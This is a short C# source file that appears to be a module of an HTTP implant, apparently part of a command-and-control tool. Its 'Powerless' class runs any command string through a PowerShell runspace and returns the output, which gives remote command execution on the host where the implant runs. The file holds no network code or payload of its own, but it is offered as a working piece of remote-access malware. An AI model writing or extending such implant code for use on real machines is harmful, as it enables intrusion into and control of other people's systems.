using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading.Tasks;

namespace HTTPImplant.Modules
{
    public class Powerless
    {
        public static string Exec(string cmd)
        {
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();

                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;

                    ps.AddCommand("powershell");
                    ps.AddArgument(cmd);

                    // Capturing the output
                    var results = ps.Invoke();

                    // Building a string from the results
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (var result in results)
                    {
                        stringBuilder.AppendLine(result.ToString());
                    }

                    return stringBuilder.ToString();
                }
            }
        }
    }
}
